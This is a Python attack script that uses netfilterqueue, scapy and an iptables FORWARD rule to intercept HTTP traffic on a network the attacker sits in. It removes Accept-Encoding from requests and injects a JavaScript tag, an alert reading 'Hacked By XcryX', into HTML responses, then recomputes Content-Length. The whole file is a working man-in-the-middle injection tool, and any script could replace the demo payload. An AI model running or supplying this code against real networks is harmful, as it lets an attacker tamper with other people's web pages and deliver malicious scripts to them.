import netfilterqueue as net
import scapy.all as scapy
import re
import subprocess

subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 2",shell=True)
try:
    def set_load(scapy_packet,load):
        scapy_packet[scapy.Raw].load = load
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.TCP].chksum
        return scapy_packet

    def FunyBunny(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet.haslayer(scapy.TCP):
                load = scapy_packet[scapy.Raw].load
                if scapy_packet[scapy.TCP].dport == 80:
                    print("HTTP Request")
                    load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
                    load.replace("HTTP/1.1","HTTP/1.0")
                    
                if scapy_packet[scapy.TCP].sport == 80:
                    print("HTTP Response")
                    print(scapy_packet.show())
                    cod = "<script>alert('Hacked By XcryX');</script>"
                    load = load.replace("</body>",cod+ "</body>")
                    content_length = re.search("(?:Content-Length:\s)(\d*)",load)
                    if content_length:
                        content = content_length.group(1)
                        new_content = int(content) + len(cod)
                        load = load.replace(content,str(new_content))

                    

                if load != scapy_packet[scapy.Raw].load:
                    new_packet= set_load(scapy_packet,load)
                    packet.set_payload(str(new_packet))

                    

                        
        packet.accept()
    print("[+] Operation starting .... ")
    queue  = net.NetfilterQueue()
    queue.bind(2,FunyBunny)
    queue.run()
except KeyboardInterrupt:
    print("Ctrl + C Detected, Quitting...")
    subprocess.call("sudo iptables --flush",shell=True)
 

